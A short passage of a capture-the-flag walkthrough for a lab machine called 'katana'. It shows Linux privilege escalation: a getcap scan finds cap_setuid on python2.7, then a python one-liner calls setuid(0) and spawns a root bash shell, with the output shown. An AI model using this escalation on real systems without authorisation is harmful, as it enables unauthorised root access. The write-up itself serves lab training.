When I was enumerating system info, I found capabilities.

www-data@katana:/opt/manager/html$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
www-data@katana:/opt/manager/html$

+ep flags:
1. e = Effective (the capability is active when the program runs).
2. p = Permitted (the capability is allowed to be effective).

cap_setuid, cap_setgid : can change UIDs/GIDs

Therefore, we can generate new bash with setuid(0) function.

www-data@katana:~$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@katana:/opt/manager/html# whoami
root

We successfully changed to root user. You can locate local.txt under /var/www/ and root text under /root.
